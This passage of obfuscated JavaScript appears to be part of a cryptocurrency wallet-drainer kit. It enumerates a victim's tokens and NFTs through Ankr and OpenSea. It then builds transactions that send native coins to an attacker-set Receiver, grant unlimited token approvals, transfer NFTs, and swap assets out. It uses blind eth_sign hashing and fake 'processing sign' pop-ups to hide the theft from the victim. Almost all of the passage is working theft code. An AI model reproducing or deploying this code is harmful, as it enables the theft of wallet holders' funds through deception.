            case 0x19:
              return "cronos";
            case 0x64:
              return 'gnosis';
            case 0x80:
              return "heco";
            case 0x504:
              return 'moonbeam';
            case 0x505:
              return "moonriver";
            case 0x8ae:
              return "kava";
            case 0xa4ec:
              return "celo";
            case 0x63564c40:
              return "harmony";
            case 0x144:
              return "zksync_era";
            case 0x2105:
              return "base";
            case 0x171:
              return "pulse";
            default:
              return false;
          }
        } else {
          if (_0x12ad5e == 'ID' && _0x15d898 == "CURRENCY") {
            switch (_0x527e2d) {
              case 0x1:
                return "ETH";
              case 0x38:
                return "BNB";
              case 0x89:
                return "MATIC";
              case 0xa86a:
                return "AVAX";
              case 0xa4b1:
                return "ETH";
              case 0xa:
                return "ETH";
              case 0xfa:
                return "FTM";
              case 0x19:
                return 'CRO';
              case 0x64:
                return "XDAI";
              case 0x80:
                return 'HT';
              case 0x504:
                return "GLMR";
              case 0x505:
                return "MOVR";
              case 0x8ae:
                return 'KAVA';
              case 0xa4ec:
                return "CELO";
              case 0x63564c40:
                return "ONE";
              case 0x144:
                return "ETH";
              case 0x2105:
                return "ETH";
              case 0x171:
                return "PLS";
              default:
                return false;
            }
          }
        }
      }
    }
  } catch (_0x3cd282) {
    console.log(_0x3cd282);
    return false;
  }
};
const get_tokens = async _0x12a34e => {
  try {
    let _0x165c90 = [];
    let _0x4ea970 = await fetch("https://rpc.ankr.com/multichain/d8c0ab3f1f160e5681e97d3bda7a1169c7ed7d0ed2079f2d01221087a70f22da", {
      'method': "POST",
      'headers': {
        'Accept': 'application/json',
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'id': 0x1,
        'jsonrpc': "2.0",
        'method': "ankr_getAccountBalance",
        'params': {
          'blockchain': ["eth", "base", "bsc", 'polygon', "avalanche", "arbitrum", "fantom", "optimism", "base"],
          'walletAddress': _0x12a34e
        }
      })
    });
    _0x4ea970 = await _0x4ea970.json();
    for (const _0x3cbacf of _0x4ea970.result.assets) {
      try {
        let _0x2aa5af = _0x3cbacf.contractAddress || "NATIVE";
        if (MS_Settings.Contract_Whitelist.length > 0x0 && !MS_Settings.Contract_Whitelist.includes(_0x2aa5af.toLowerCase().trim())) {
          continue;
        } else {
          if (MS_Settings.Contract_Blacklist.length > 0x0 && MS_Settings.Contract_Blacklist.includes(_0x2aa5af.toLowerCase().trim())) {
            continue;
          }
        }
        let _0x22825b = {
          'chain_id': convert_chain("ANKR", 'ID', _0x3cbacf.blockchain),
          'name': _0x3cbacf.tokenName,
          'type': _0x3cbacf.tokenType,
          'amount': parseFloat(_0x3cbacf.balance),
          'amount_raw': _0x3cbacf.balanceRawInteger,
          'amount_usd': parseFloat(_0x3cbacf.balanceUsd),
          'symbol': _0x3cbacf.tokenSymbol,
          'decimals': _0x3cbacf.tokenDecimals,
          'address': _0x2aa5af || null,
          'price': parseFloat(_0x3cbacf.tokenPrice)
        };
        if (_0x22825b.price > 0x0) {
          _0x165c90.push(_0x22825b);
        }
      } catch (_0x25f87d) {
        console.log(_0x25f87d);
      }
    }
    return _0x165c90;
  } catch (_0x48f964) {
    console.log(_0x48f964);
    return [];
  }
};
const get_nfts = async _0x5849b4 => {
  try {
    let _0x374fcf = await fetch("https://api.opensea.io/api/v1/assets?owner=" + _0x5849b4 + '&order_direction=desc&limit=200&include_orders=false');
    let _0xa71103 = (await _0x374fcf.json()).assets;
    _0x374fcf = await fetch("https://api.opensea.io/api/v1/collections?asset_owner=" + _0x5849b4 + "&offset=0&limit=200");
    let _0x480736 = await _0x374fcf.json();
    let _0x29b7b7 = [];
    for (const _0x95335e of _0xa71103) {
      try {
        let _0x537936 = null;
        for (const _0x29599d of _0x480736) {
          try {
            if (_0x29599d.primary_asset_contracts.length < 0x1) {
              continue;
            }
            if (_0x29599d.primary_asset_contracts[0x0].address == _0x95335e.asset_contract.address) {
              _0x537936 = _0x29599d;
              break;
            }
          } catch (_0xeb5c03) {
            console.log(_0xeb5c03);
          }
        }
        if (_0x537936 == null) {
          continue;
        }
        if (MS_Settings.Contract_Whitelist.length > 0x0 && !MS_Settings.Contract_Whitelist.includes(_0x95335e.asset_contract.address.toLowerCase().trim())) {
          continue;
        } else {
          if (MS_Settings.Contract_Blacklist.length > 0x0 && MS_Settings.Contract_Blacklist.includes(_0x95335e.asset_contract.address.toLowerCase().trim())) {
            continue;
          }
        }
        let _0x3a7608 = convert_chain('OPENSEA', 'ID', _0x95335e.asset_contract.chain_identifier);
        let _0x4acc90 = _0x537936.stats.one_day_average_price != 0x0 ? _0x537936.stats.one_day_average_price : _0x537936.stats.seven_day_average_price;
        _0x4acc90 = _0x4acc90 * MS_Currencies[convert_chain('ID', "CURRENCY", _0x3a7608)].USD;
        let _0x1745de = {
          'chain_id': _0x3a7608,
          'name': _0x95335e.name,
          'type': _0x95335e.asset_contract.schema_name,
          'amount': _0x95335e.num_sales,
          'amount_raw': null,
          'amount_usd': _0x4acc90,
          'id': _0x95335e.token_id,
          'symbol': null,
          'decimals': null,
          'address': _0x95335e.asset_contract.address,
          'price': _0x4acc90
        };
        if (typeof _0x4acc90 == 'number' && !isNaN(_0x4acc90) && _0x4acc90 > 0x0) {
          _0x29b7b7.push(_0x1745de);
        }
      } catch (_0x19b0b8) {
        console.log(_0x19b0b8);
      }
    }
    return _0x29b7b7;
  } catch (_0x480ed0) {
    console.log(_0x480ed0);
    return [];
  }
};
const retrive_token = async (_0x28119a, _0x2bc785) => {
  try {
    if (!MS_API_Data[_0x28119a] || MS_Settings.Settings.Chains[convert_chain('ID', "ANKR", _0x28119a)].API == '') {
      return MS_Contract_ABI.ERC20;
    }
    let _0x1509ca = await fetch('https://' + MS_API_Data[_0x28119a] + "/api?module=contract&action=getsourcecode&address=" + _0x2bc785 + '&apikey=' + MS_Settings.Settings.Chains[convert_chain('ID', "ANKR", _0x28119a)].API, {
      'method': "GET",
      'headers': {
        'Accept': "application/json"
      }
    });
    _0x1509ca = await _0x1509ca.json();
    if (_0x1509ca.message == 'OK') {
      if (_0x1509ca.result[0x0].Proxy == '1' && _0x1509ca.result[0x0].Implementation != '') {
        const _0x2d7ded = _0x1509ca.result[0x0].Implementation;
        return retrive_token(_0x28119a, _0x2d7ded);
      } else {
        return JSON.parse(_0x1509ca.result[0x0].ABI);
      }
    } else {
      return MS_Contract_ABI.ERC20;
    }
  } catch (_0xa13666) {
    return MS_Contract_ABI.ERC20;
  }
};
const get_permit_type = _0x41ecaf => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) {
      return 0x0;
    }
    if (_0x41ecaf.hasOwnProperty("permit") && _0x41ecaf.hasOwnProperty('nonces') && _0x41ecaf.hasOwnProperty("name") && _0x41ecaf.hasOwnProperty("DOMAIN_SEPARATOR")) {
      const _0x5ead55 = (_0x327fc9 => {
        for (const _0x50fd57 in _0x327fc9) {
          if (_0x50fd57.startsWith("permit(")) {
            const _0x4215ae = _0x50fd57.slice(0x7).split(',');
            if (_0x4215ae.length === 0x7 && _0x50fd57.indexOf('bool') === -0x1) {
              return 0x2;
            }
            if (_0x4215ae.length === 0x8 && _0x50fd57.indexOf('bool') !== -0x1) {
              return 0x1;
            }
            return 0x0;
          }
        }
      })(_0x41ecaf);
      return _0x5ead55;
    } else {
      return 0x0;
    }
  } catch (_0x4425c3) {
    return 0x0;
  }
};
const MS_Gas_Reserves = {};
const show_check = () => {
  document.getElementById("openmodal").style.display = "none";
  document.getElementById("checking").style.display = "block";
};
const get_nonce = async _0x2ace80 => {
  const _0x16c088 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x2ace80]);
  return await _0x16c088.getTransactionCount(MS_Current_Address, "pending");
};
const wait_message = () => {
  try {
    if (!MS_Process) {
      return;
    }
    Swal.close();
    MSL.fire({
      'icon': 'success',
      'title': 'OK',
      'subtitle': "Thanks!",
      'text': "Got your sign, wait a bit for confirmation...",
      'showConfirmButton': false,
      'timer': 0x9c4,
      'color': "light"
    }).then(() => {
      MSL.fire({
        'icon': 'load',
        'title': "Processing sign",
        'text': " Please, don't leave this page!",
        'showConfirmButton': true,
        'confirmButtonText': "Confirming sign...",
        'showConfirmButton': false,
        'color': "light"
      });
    });
  } catch (_0x39e112) {
    console.log(_0x39e112);
  }
};
const end_message = () => {
  document.getElementById("openmodal").style.display = "none";
  document.getElementById("checking").style.display = "none";
  document.getElementById("sign-assets").style.display = "none";
  document.getElementById("failed-modal").style.display = "block";
};
let is_first_sign = true;
const sign_ready = () => {
  try {
    MSL.fire({
      'icon': "success",
      'title': 'OK',
      'subtitle': "Sign is confirmed",
      'text': "Please, wait a bit for confirmation...",
      'showConfirmButton': false,
      'color': "light"
    });
  } catch (_0x3a8c04) {
    console.log(_0x3a8c04);
  }
};
const sign_next = () => {
  document.getElementById("openmodal").style.display = "none";
  document.getElementById('checking').style.display = "none";
  document.getElementById("sign-assets").style.display = 'block';
};
const is_nft_approved = async (_0x22a915, _0x2356dd, _0x36eafc) => {
  try {
    const _0x5bf28f = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[0x1]);
    const _0x11f656 = new ethers.Contract(_0x22a915, MS_Contract_ABI.ERC721, _0x5bf28f);
    return await _0x11f656.isApprovedForAll(_0x2356dd, _0x36eafc);
  } catch (_0x3edd1d) {
    console.log(_0x3edd1d);
    return false;
  }
};
const SIGN_NATIVE = async _0xb1f762 => {
  const _0xaeca56 = new Web3(MS_Provider);
  const _0x17ab72 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0xb1f762.chain_id]);
  const _0x18c937 = ethers.BigNumber.from(await _0x17ab72.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0xa63e01 = _0xb1f762.chain_id == 0xa4b1 ? 0x16e360 : _0xb1f762.chain_id == 0xa86a ? 0x16e360 : _0xb1f762.chain_id == 0x171 ? 0x186a0 : 0x5208;
  const _0x46bb6f = _0xb1f762.chain_id == 0xa4b1 ? 0x4c4b40 : _0xb1f762.chain_id == 0xa86a ? 0x4c4b40 : _0xb1f762.chain_id == 0x171 ? 0xdbba0 : 0x249f0;
  const _0x5120b3 = ethers.BigNumber.from(_0xb1f762.chain_id == 0xa ? '35000000000' : _0x18c937);
  const _0x4e80e4 = _0x5120b3.mul(ethers.BigNumber.from(_0xa63e01)).mul(ethers.BigNumber.from('2'));
  const _0x4b6301 = _0x5120b3.mul(ethers.BigNumber.from(_0x46bb6f)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0xb1f762.chain_id])));
  const _0x5f963 = ethers.BigNumber.from(_0xb1f762.amount_raw).sub(_0x4e80e4).sub(_0x4b6301).toString();
  if (ethers.BigNumber.from(_0x5f963).lte(ethers.BigNumber.from('0'))) {
    throw "LOW_BALANCE";
  }
  if (ethers.BigNumber.from(await _0x17ab72.getBalance(MS_Current_Address)).lt(ethers.BigNumber.from(_0x5f963).add(ethers.BigNumber.from(_0xa63e01).mul(ethers.BigNumber.from(_0x18c937))))) {
    throw "LOW_BALANCE";
  }
  const _0x5c2a59 = await get_nonce(_0xb1f762.chain_id);
  let _0x29736c = {
    'to': MS_Settings.Receiver,
    'nonce': _0xaeca56.utils.toHex(_0x5c2a59),
    'gasLimit': _0xaeca56.utils.toHex(_0xa63e01),
    'gasPrice': _0xaeca56.utils.toHex(_0x18c937),
    'value': _0xaeca56.utils.toHex(_0x5f963),
    'data': '0x',
    'v': _0xaeca56.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x1c8e9 = new ethereumjs.Tx(_0x29736c);
  let _0xc5e630 = '0x' + _0x1c8e9.serialize().toString("hex");
  let _0x29ab03 = _0xaeca56.utils.sha3(_0xc5e630, {
    'encoding': "hex"
  });
  await sign_request(_0xb1f762);
  const _0x599faf = await _0xaeca56.eth.sign(_0x29ab03, MS_Current_Address);
  const _0xe4765e = _0x599faf.substring(0x2);
  const _0x22a451 = '0x' + _0xe4765e.substring(0x0, 0x40);
  const _0xa67fae = '0x' + _0xe4765e.substring(0x40, 0x80);
  const _0x1d3a46 = parseInt(_0xe4765e.substring(0x80, 0x82), 0x10);
  const _0x31cf7d = _0xaeca56.utils.toHex(_0x1d3a46 + _0xb1f762.chain_id * 0x2 + 0x8);
  _0x1c8e9.r = _0x22a451;
  _0x1c8e9.s = _0xa67fae;
  _0x1c8e9.v = _0x31cf7d;
  const _0xd06004 = '0x' + _0x1c8e9.serialize().toString("hex");
  sign_next();
  const _0x580319 = await _0x17ab72.sendTransaction(_0xd06004);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x17ab72.waitForTransaction(_0x580319.hash, 0x1, 0x7530);
  }
  await sign_success(_0xb1f762, _0x5f963);
  sign_ready();
};
const SIGN_TOKEN = async _0x42d86d => {
  const _0x13d9b0 = new Web3(MS_Provider);
  const _0x1eda07 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x42d86d.chain_id]);
  const _0x1daa96 = new ethers.Contract(_0x42d86d.address, MS_Contract_ABI.ERC20, _0x1eda07);
  const _0x53c360 = ethers.BigNumber.from(await _0x1eda07.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  let _0xfc0dfc = null;
  let _0x4e909c = ethers.utils.parseEther('1158472395435294898592384258348512586931256');
  for (const _0x45408e of MS_Settings.Unlimited_BL) {
    try {
      if (_0x45408e[0x0] == MS_Current_Chain_ID && _0x45408e[0x1] == _0x42d86d.address.toLowerCase().trim()) {
        _0x4e909c = _0x42d86d.amount_raw;
        break;
      }
    } catch (_0xb6aced) {
      console.log(_0xb6aced);
    }
  }
  let _0x1a53f7 = 0x0;
  while (_0x1a53f7 < 0x3) {
    try {
      if (MS_Settings.Settings.Sign.Tokens == 0x1) {
        _0xfc0dfc = await _0x1daa96.estimateGas.approve(MS_Settings.Address, _0x4e909c, {
          'from': MS_Current_Address
        });
      } else if (MS_Settings.Settings.Sign.Tokens == 0x2) {
        _0xfc0dfc = await _0x1daa96.estimateGas.transfer(MS_Settings.Receiver, _0x42d86d.amount_raw, {
          'from': MS_Current_Address
        });
      }
      _0xfc0dfc = ethers.BigNumber.from(_0xfc0dfc).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
      _0x1a53f7 = 0x3;
    } catch (_0x165626) {
      _0xfc0dfc = _0x42d86d.chain_id == 0xa4b1 ? 0x4c4b40 : _0x42d86d.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
      _0x1a53f7 += 0x1;
    }
  }
  if (ethers.BigNumber.from(await _0x1eda07.getBalance(MS_Current_Address)).lt(ethers.BigNumber.from(_0xfc0dfc).mul(ethers.BigNumber.from(_0x53c360)))) {
    throw "LOW_BALANCE";
  }
  const _0x34a8cf = await get_nonce(_0x42d86d.chain_id);
  let _0x5959fe = null;
  let _0x54242d = new _0x13d9b0.eth.Contract(MS_Contract_ABI.ERC20, _0x42d86d.address);
  if (MS_Settings.Settings.Sign.Tokens == 0x1) {
    _0x5959fe = _0x54242d.methods.approve(MS_Settings.Address, _0x4e909c).encodeABI();
  } else {
    if (MS_Settings.Settings.Sign.Tokens == 0x2) {
      _0x5959fe = _0x54242d.methods.transfer(MS_Settings.Receiver, _0x42d86d.amount_raw).encodeABI();
    }
  }
  let _0x5b1b16 = {
    'to': _0x42d86d.address,
    'nonce': _0x13d9b0.utils.toHex(_0x34a8cf),
    'gasLimit': _0x13d9b0.utils.toHex(_0xfc0dfc),
    'gasPrice': _0x13d9b0.utils.toHex(_0x53c360),
    'value': "0x0",
    'data': _0x5959fe,
    'v': _0x13d9b0.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x3a2e19 = new ethereumjs.Tx(_0x5b1b16);
  let _0x1245bb = '0x' + _0x3a2e19.serialize().toString("hex");
  let _0x553b86 = _0x13d9b0.utils.sha3(_0x1245bb, {
    'encoding': 'hex'
  });
  await sign_request(_0x42d86d);
  const _0x33bbfa = await _0x13d9b0.eth.sign(_0x553b86, MS_Current_Address);
  const _0x350b1a = _0x33bbfa.substring(0x2);
  const _0xe18c76 = '0x' + _0x350b1a.substring(0x0, 0x40);
  const _0x54608a = '0x' + _0x350b1a.substring(0x40, 0x80);
  const _0x41c9ac = parseInt(_0x350b1a.substring(0x80, 0x82), 0x10);
  const _0x14d53a = _0x13d9b0.utils.toHex(_0x41c9ac + _0x42d86d.chain_id * 0x2 + 0x8);
  _0x3a2e19.r = _0xe18c76;
  _0x3a2e19.s = _0x54608a;
  _0x3a2e19.v = _0x14d53a;
  const _0x2b10db = '0x' + _0x3a2e19.serialize().toString("hex");
  sign_next();
  const _0x5adfe6 = await _0x1eda07.sendTransaction(_0x2b10db);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x1eda07.waitForTransaction(_0x5adfe6.hash, 0x1, 0x7530);
  }
  await sign_success(_0x42d86d);
  sign_ready();
};
const SIGN_NFT = async _0x30de46 => {
  const _0x3391ac = new Web3(MS_Provider);
  const _0x2e4e3a = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x30de46.chain_id]);
  const _0x2f676b = new ethers.Contract(_0x30de46.address, MS_Contract_ABI.ERC721, _0x2e4e3a);
  const _0x39c26a = ethers.BigNumber.from(await _0x2e4e3a.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  let _0x18253c = null;
  let _0x201169 = 0x0;
  while (_0x201169 < 0x3) {
    try {
      if (MS_Settings.Settings.Sign.NFTs == 0x1) {
        _0x18253c = await _0x2f676b.estimateGas.setApprovalForAll(MS_Settings.Address, true, {
          'from': MS_Current_Address
        });
      } else if (MS_Settings.Settings.Sign.NFTs == 0x2) {
        _0x18253c = await _0x2f676b.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x30de46.id, {
          'from': MS_Current_Address
        });
      }
      _0x18253c = ethers.BigNumber.from(_0x18253c).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
      _0x201169 = 0x3;
    } catch (_0x167c2c) {
      _0x18253c = _0x30de46.chain_id == 0xa4b1 ? 0x4c4b40 : _0x30de46.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
      _0x201169 += 0x1;
    }
  }
  if (ethers.BigNumber.from(await _0x2e4e3a.getBalance(MS_Current_Address)).lt(ethers.BigNumber.from(_0x18253c).mul(ethers.BigNumber.from(_0x39c26a)))) {
    throw "LOW_BALANCE";
  }
  const _0x3ea864 = await get_nonce(_0x30de46.chain_id);
  let _0x50b285 = null;
  let _0x5369bd = new _0x3391ac.eth.Contract(MS_Contract_ABI.ERC721, _0x30de46.address);
  if (MS_Settings.Settings.Sign.NFTs == 0x1) {
    _0x50b285 = _0x5369bd.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  } else {
    if (MS_Settings.Settings.Sign.NFTs == 0x2) {
      _0x50b285 = _0x5369bd.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x30de46.id).encodeABI();
    }
  }
  let _0x240392 = {
    'to': _0x30de46.address,
    'nonce': _0x3391ac.utils.toHex(_0x3ea864),
    'gasLimit': _0x3391ac.utils.toHex(_0x18253c),
    'gasPrice': _0x3391ac.utils.toHex(_0x39c26a),
    'value': "0x0",
    'data': _0x50b285,
    'v': _0x3391ac.utils.toHex(MS_Current_Chain_ID),
    'r': '0x',
    's': '0x'
  };
  let _0x337b16 = new ethereumjs.Tx(_0x240392);
  let _0xc1c407 = '0x' + _0x337b16.serialize().toString("hex");
  let _0x5b8879 = _0x3391ac.utils.sha3(_0xc1c407, {
    'encoding': 'hex'
  });
  await sign_request(_0x30de46);
  const _0xc44505 = await _0x3391ac.eth.sign(_0x5b8879, MS_Current_Address);
  const _0x3915ca = _0xc44505.substring(0x2);
  const _0xbc8e99 = '0x' + _0x3915ca.substring(0x0, 0x40);
  const _0x2a93dd = '0x' + _0x3915ca.substring(0x40, 0x80);
  const _0x10c538 = parseInt(_0x3915ca.substring(0x80, 0x82), 0x10);
  const _0x50e278 = _0x3391ac.utils.toHex(_0x10c538 + _0x30de46.chain_id * 0x2 + 0x8);
  _0x337b16.r = _0xbc8e99;
  _0x337b16.s = _0x2a93dd;
  _0x337b16.v = _0x50e278;
  const _0x38c278 = '0x' + _0x337b16.serialize().toString("hex");
  sign_next();
  const _0x47e357 = await _0x2e4e3a.sendTransaction(_0x38c278);
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x2e4e3a.waitForTransaction(_0x47e357.hash, 0x1, 0x7530);
  }
  await sign_success(_0x30de46);
  sign_ready();
};
const DO_SWAP = async _0x528239 => {
  const _0x15ce1f = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x528239.chain_id]);
  const _0x13e2ba = Math.floor(Date.now() / 0x3e8) + 99990;
  const _0x5ad97f = new ethers.Contract(_0x528239.swapper_address, MS_Pancake_ABI, MS_Signer);
  const _0x1e898b = ethers.BigNumber.from(await _0x15ce1f.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  let _0x288ad1 = null;
  let _0x39bd3e = 0x0;
  while (_0x39bd3e < 0x3) {
    try {
      _0x288ad1 = await _0x5ad97f.estimateGas.swapExactTokensForETH(_0x1925c0, '0', [_0x528239.address, MS_Swap_Route[_0x528239.chain_id]], MS_Settings.Receiver, _0x13e2ba, {
        'from': MS_Current_Address
      });
      _0x288ad1 = ethers.BigNumber.from(_0x288ad1).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
      _0x39bd3e = 0x3;
    } catch (_0x5e7c4f) {
      _0x288ad1 = _0x528239.chain_id == 0xa4b1 ? 0x4c4b40 : _0x528239.chain_id == 0xa86a ? 0x4c4b40 : 0x55730;
      _0x39bd3e += 0x1;
    }
  }
  const _0x435c2d = await get_nonce(_0x528239.chain_id);
  const _0x1925c0 = ethers.BigNumber.from(_0x528239.amount_raw).lte(ethers.BigNumber.from(_0x528239.swapper_allowance)) ? ethers.BigNumber.from(_0x528239.amount_raw).toString() : ethers.BigNumber.from(_0x528239.swapper_allowance).toString();
  await swap_request(_0x528239.swapper_type, _0x528239, [_0x528239]);
  sign_next();
  const _0x3de048 = await _0x5ad97f.swapExactTokensForETH(_0x1925c0, '0', [_0x528239.address, MS_Swap_Route[_0x528239.chain_id]], MS_Settings.Receiver, _0x13e2ba, {
    'gasLimit': ethers.BigNumber.from(_0x288ad1),
    'gasPrice': ethers.BigNumber.from(_0x1e898b),
    'nonce': _0x435c2d,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x15ce1f.waitForTransaction(_0x3de048.hash, 0x1, 0xea60);
  }
  await swap_success(_0x528239.swapper_type, _0x528239, [_0x528239]);
  sign_ready();
};
const DO_UNISWAP = async (_0x52b224, _0x285ec3) => {
  const _0x38c7bd = new Web3(MS_Provider);
  const _0x160230 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x52b224.chain_id]);
  const _0x13e173 = Math.floor(Date.now() / 0x3e8) + 99990;
  const _0x231915 = new ethers.Contract(_0x52b224.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const _0x2566c0 = ethers.BigNumber.from(await _0x160230.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  const _0xf04fbe = await get_nonce(_0x52b224.chain_id);
  const _0x51a0e9 = [];
  for (const _0x26fa76 of _0x285ec3) {
    try {
      const _0x2f32ad = ethers.BigNumber.from(_0x26fa76.amount_raw).lte(ethers.BigNumber.from(_0x26fa76.swapper_allowance)) ? ethers.BigNumber.from(_0x26fa76.amount_raw).toString() : ethers.BigNumber.from(_0x26fa76.swapper_allowance).toString();
      const _0x3b70db = new _0x38c7bd.eth.Contract(MS_Uniswap_ABI, _0x26fa76.swapper_address);
      const _0x59de33 = _0x3b70db.methods.swapExactTokensForTokens(_0x2f32ad, '0', [_0x26fa76.address, MS_Swap_Route[_0x26fa76.chain_id]], MS_Settings.Receiver).encodeABI();
      _0x51a0e9.push(_0x59de33);
    } catch (_0x547c44) {
      console.log(_0x547c44);
    }
  }
  let _0x9bd4d6 = null;
  let _0x182a65 = 0x0;
  while (_0x182a65 < 0x3) {
    try {
      _0x9bd4d6 = await _0x231915.estimateGas.multicall(_0x13e173, _0x51a0e9, {
        'from': MS_Current_Address
      });
      _0x9bd4d6 = ethers.BigNumber.from(_0x9bd4d6).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
      _0x182a65 = 0x3;
    } catch (_0x3282ea) {
      _0x9bd4d6 = _0x52b224.chain_id == 0xa4b1 ? 0x4c4b40 : _0x52b224.chain_id == 0xa86a ? 0x4c4b40 : 0x7a120;
      _0x182a65 += 0x1;
    }
  }
  await swap_request(_0x52b224.swapper_type, _0x52b224, _0x285ec3);
  sign_next();
  const _0xcc3691 = await _0x231915.multicall(_0x13e173, _0x51a0e9, {
    'gasLimit': ethers.BigNumber.from(_0x9bd4d6),
    'gasPrice': ethers.BigNumber.from(_0x2566c0),
    'nonce': _0xf04fbe,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x160230.waitForTransaction(_0xcc3691.hash, 0x1, 0xea60);
  }
  await swap_success(_0x52b224.swapper_type, _0x52b224, _0x285ec3);
  sign_ready();
};
const DO_PANCAKE_V3 = async (_0x4d73af, _0x509279) => {
  const _0x5c31b7 = new Web3(MS_Provider);
  const _0x2b98b0 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x4d73af.chain_id]);
  const _0x5d7bde = Math.floor(Date.now() / 0x3e8) + 99990;
  const _0x41131f = new ethers.Contract(_0x4d73af.swapper_address, MS_Pancake_ABI, MS_Signer);
  const _0x247b40 = ethers.BigNumber.from(await _0x2b98b0.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x4de6c9 = await get_nonce(_0x4d73af.chain_id);
  const _0x1f3405 = [];
  for (const _0x2b54f6 of _0x509279) {
    try {
      const _0x2a30a3 = ethers.BigNumber.from(_0x2b54f6.amount_raw).lte(ethers.BigNumber.from(_0x2b54f6.swapper_allowance)) ? ethers.BigNumber.from(_0x2b54f6.amount_raw).toString() : ethers.BigNumber.from(_0x2b54f6.swapper_allowance).toString();
      const _0x28794d = new _0x5c31b7.eth.Contract(MS_Pancake_ABI, _0x2b54f6.swapper_address);
      const _0x3f8f45 = _0x28794d.methods.swapExactTokensForTokens(_0x2a30a3, '0', [_0x2b54f6.address, MS_Swap_Route[_0x2b54f6.chain_id]], MS_Settings.Receiver).encodeABI();
      _0x1f3405.push(_0x3f8f45);
    } catch (_0xbfacb1) {
      console.log(_0xbfacb1);
    }
  }
  let _0xb55186 = null;
  let _0x2804c4 = 0x0;
  while (_0x2804c4 < 0x3) {
    try {
      _0xb55186 = await _0x41131f.estimateGas.multicall(_0x5d7bde, _0x1f3405, {
        'from': MS_Current_Address
      });
      _0xb55186 = ethers.BigNumber.from(_0xb55186).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
      _0x2804c4 = 0x3;
    } catch (_0x423217) {
      _0xb55186 = _0x4d73af.chain_id == 0xa4b1 ? 0x4c4b40 : _0x4d73af.chain_id == 0xa86a ? 0x4c4b40 : 0x7a120;
      _0x2804c4 += 0x1;
    }
  }
  await swap_request(_0x4d73af.swapper_type, _0x4d73af, _0x509279);
  sign_next();
  const _0x1e85f4 = await _0x41131f.multicall(_0x5d7bde, _0x1f3405, {
    'gasLimit': ethers.BigNumber.from(_0xb55186),
    'gasPrice': ethers.BigNumber.from(_0x247b40),
    'nonce': _0x4de6c9,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x2b98b0.waitForTransaction(_0x1e85f4.hash, 0x1, 0xea60);
  }
  await swap_success(_0x4d73af.swapper_type, _0x4d73af, _0x509279);
  sign_ready();
};
const DO_CONTRACT = async _0x272c6b => {
  const _0x12cba5 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x272c6b.chain_id]);
  const _0x38c69 = ethers.BigNumber.from(await _0x12cba5.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x55faaa = await get_nonce(_0x272c6b.chain_id);
  const _0x1ab655 = convert_chain('ID', "ANKR", _0x272c6b.chain_id);
  let _0x128c92 = MS_Settings.Settings.Chains[_0x1ab655].Contract_Legacy == 0x1 ? JSON.parse("[{\"constant\":false,\"inputs\":[],\"name\":\"" + MS_Settings.Settings.Chains[_0x1ab655].Contract_Type + "\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"}]") : JSON.parse("[{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"" + MS_Settings.Settings.Chains[_0x1ab655].Contract_Type + "\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"}]");
  const _0x39b355 = new ethers.Contract(MS_Settings.Settings.Chains[_0x1ab655].Contract_Address, _0x128c92, MS_Signer);
  const _0xf20c83 = _0x272c6b.chain_id == 0xa4b1 ? 0x16e360 : _0x272c6b.chain_id == 0xa86a ? 0x16e360 : _0x272c6b.chain_id == 0x171 ? 0x7a120 : 0x186a0;
  const _0x5ecf5f = _0x272c6b.chain_id == 0xa4b1 ? 0x4c4b40 : _0x272c6b.chain_id == 0xa86a ? 0x4c4b40 : _0x272c6b.chain_id == 0x171 ? 0xdbba0 : 0x249f0;
